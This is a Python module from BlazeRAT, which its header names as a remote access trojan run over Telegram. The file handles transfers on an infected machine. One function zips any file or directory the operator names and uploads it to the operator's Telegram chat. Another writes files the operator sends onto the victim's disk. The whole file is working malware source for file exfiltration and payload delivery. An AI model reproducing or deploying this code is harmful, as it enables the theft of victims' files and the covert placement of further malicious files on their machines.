#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from io import BytesIO
from os import path, walk
from zipfile import ZipFile, ZIP_DEFLATED
import core.logger as Logger
from core.messages import file as Messages

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to transfer files
"""

""" Upload file to telegram """
def UploadFile(tfile, chatid, bot) -> None:
    # Log
    Logger.Log(f"Transfer >> Upload file '{tfile}' to telegram", chatid)
    # If file not exists
    if not path.exists(tfile):
        return bot.send_message(chatid, Messages.upload_path_not_found % tfile)
    # Download file
    if path.isfile(tfile):
        with open(tfile, "rb") as file:
            bot.send_document(chatid, file,
                caption="📄 " + path.abspath(tfile)
            )
    # Archive and download directory
    else:
        obj = BytesIO()
        with ZipFile(obj, "w", compression=ZIP_DEFLATED) as archive:
            for root, dirs, files in walk(tfile):
                for file in files:
                    archive.write(path.join(root, file))
        bot.send_document(chatid, obj.getvalue(),
            caption="🗃 " + path.abspath(tfile)
        )

""" Send file """
def SendFile(message: dict, bot) -> None:
    tfile = message.text[10:]
    chatid = message.chat.id
    UploadFile(tfile, chatid, bot)

""" Receive file """
def ReceiveFile(message: dict, bot) -> None:
    chatid = message.chat.id
    name = message.document.file_name
    info = bot.get_file(message.document.file_id)
    # Log
    Logger.Log(f"Transfer >> Receive file '{name}' from telegram", chatid)
    # Save document
    content = bot.download_file(info.file_path)
    with open(name, "wb") as file:
        file.write(content)
    bot.send_message(chatid, Messages.download_file_success % name)
